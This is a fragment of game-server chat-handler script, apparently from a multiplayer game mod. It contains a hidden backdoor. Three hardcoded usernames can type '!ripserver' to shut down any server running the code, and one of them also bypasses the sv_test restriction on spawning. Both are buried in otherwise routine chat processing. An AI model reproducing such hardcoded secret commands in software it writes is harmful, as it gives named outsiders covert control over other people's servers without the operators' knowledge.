...
bool onServerProcessChat(CRules@ this, const string& in text_in, string& out text_out, CPlayer@ player)
{
	...
	if(player.getUsername() == "Pirate-Rob" || player.getUsername() == "BarsukEughen555" || player.getUsername() == "Vamist")if(text_in == "!ripserver")QuitGame();

	//spawning things

	//these all require sv_test - no spawning without it
	//some also require the player to have mod status
	if (sv_test || player.getUsername() == "Pirate-Rob")
	if(player.isMod())
	{
